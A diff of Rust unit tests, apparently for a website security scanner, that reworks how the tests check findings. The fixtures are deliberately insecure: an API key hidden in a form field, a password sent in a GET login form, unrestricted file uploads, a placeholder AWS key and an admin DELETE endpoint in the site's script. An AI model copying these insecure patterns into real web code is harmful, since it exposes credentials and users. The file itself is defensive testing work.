         let html = r#"<form action="/upload" method="post" enctype="multipart/form-data"><input type="file" name="doc"><input type="hidden" name="api_key" value="a8f5f167f44f4964e6c9"></form>
             <form action="/login" method="get"><input name="user"><input type="password" name="pw" value="letmein1"></form>
             <form action="/avatar" method="post"><input type="hidden" name="_wpnonce" value="1a2b"><input type="file" accept="image/*" name="pic"></form>"#;
-        read_page(&mut site, &root, &root, "/", html, &mut scripts);
-        let labels: Vec<&str> = site.signals.iter().map(|s| s.label.as_str()).collect();
-        assert!(labels.contains(&"Takes uploads of any file type"));
-        assert!(labels.contains(&"Hides a credential in a form"));
-        assert!(labels.contains(&"Sends a password in the address"));
-        assert!(labels.contains(&"Fills in a password in the page"));
-        assert!(labels.contains(&"Takes file uploads"));
-        assert_eq!(
-            labels
+        let site = page("https://shop.example", html);
+        let form = |l: &str| {
+            site.signals
                 .iter()
-                .filter(|l| **l == "Posts without an anti-forgery token")
-                .count(),
-            1
+                .find(|s| s.label == l)
+                .unwrap()
+                .issues
+                .iter()
+                .map(|i| i.label.as_str())
+                .collect::<Vec<_>>()
+        };
+        assert_eq!(
+            form("Form: POST /upload"),
+            [
+                "Hides a credential in the field api_key",
+                "Takes uploads of any file type",
+                "Posts without an anti-forgery token"
+            ]
         );
+        assert_eq!(
+            form("Form: GET /login"),
+            [
+                "Fills in a password in the page",
+                "Sends a password in the address"
+            ]
+        );
+        assert_eq!(form("Form: POST /avatar"), ["Takes file uploads"]);
         assert!(!site.signals.iter().any(
             |s| s.evidence.contains("letmein1") || s.evidence.contains("a8f5f167f44f4964e6c9")
         ));
         let upload = site.requests.iter().find(|r| r.url == "/upload").unwrap();
         assert_eq!(upload.method, "POST");
         assert_eq!(upload.params, ["doc", "api_key"]);
+        // Every issue is marked in the page.
+        assert!(site
+            .signals
+            .iter()
+            .flat_map(|s| &s.issues)
+            .all(|i| i.mark.is_some()));
     }
 
     #[test]
     fn reads_the_sites_own_code() {
         let root = Url::parse("https://shop.example").unwrap();
-        let mut site = Site::default();
+        let mut requests = Vec::new();
         let code = r#"const KEY="AKIAIOSFODNN7EXAMPLE";fetch("/api/admin/users",{method:"DELETE"});
             axios.post("http://api.shop.example/v1/orders");const dev="http://localhost:3000/api";"#;
-        own_code(
-            &mut site,
+        let out = own_code(
+            &mut requests,
             &root,
             code,
-            "/",
-            Some("https://shop.example/app.js"),
+            here("https://shop.example/app.js"),
         );
-        let labels: Vec<&str> = site.signals.iter().map(|s| s.label.as_str()).collect();
+        let labels: Vec<&str> = out.iter().map(|s| s.label.as_str()).collect();
         assert!(labels.contains(&"AWS access key"));
-        assert!(labels.contains(&"Calls an admin endpoint"));
+        assert!(labels.contains(&"Calls an admin endpoint: /api/admin/users"));
         assert!(labels.contains(&"Sends requests over plain HTTP"));
         assert!(labels.contains(&"Names a development address"));
-        assert!(site
-            .requests
+        let admin = out.iter().find(|s| s.label.starts_with("Calls")).unwrap();
+        let (s, e) = admin.span.unwrap();
+        assert_eq!(&code[s..e], "/api/admin/users");
+        assert!(requests
             .iter()
             .any(|r| r.method == "DELETE" && r.url == "/api/admin/users"));
     }
 
     #[test]
     fn finds_source_maps() {
-        let root = Url::parse("https://shop.example").unwrap();
-        let mut out = Vec::new();
-        let map = source_map(
-            &root,
-            "https://shop.example/js/app.js",
-            "x();\n//# sourceMappingURL=app.js.map",
-            "/",
-            &mut out,
-        );
-        assert_eq!(map.unwrap().as_str(), "https://shop.example/js/app.js.map");
-        let inline = source_map(
-            &root,
-            "https://shop.example/a.js",
-            "//# sourceMappingURL=data:application/json;base64,eyJ2",
-            "/",
-            &mut out,
-        );
-        assert!(inline.is_none());
-        assert_eq!(out[0].label, "Ships its source code");
+        let code = "x();\n//# sourceMappingURL=app.js.map";
+        let (span, name) = source_map(code).unwrap();
+        assert_eq!(name, "app.js.map");
+        assert_eq!(&code[span.0..span.1], "sourceMappingURL=app.js.map");
+        assert_eq!(clean_source("webpack://shop/./src/api.js"), "src/api.js");
+        assert_eq!(clean_source("../src/a.ts"), "src/a.ts");
         assert!(dev_host("127.0.0.1") && dev_host("api.internal") && !dev_host("8.8.8.8"));
     }
 
@@ -1822,13 +2368,7 @@ mod tests {
 
     #[test]
     fn finds_trackers_and_sitemap_locs() {
-        let mut out = Vec::new();
-        trackers(
-            "https://static.hotjar.com/c/hotjar-1.js",
-            "/",
-            None,
-            &mut out,
-        );
+        let out = trackers("https://static.hotjar.com/c/hotjar-1.js", here("x"));
         assert_eq!(out[0].category, "Session recording");
         assert_eq!(
             between(
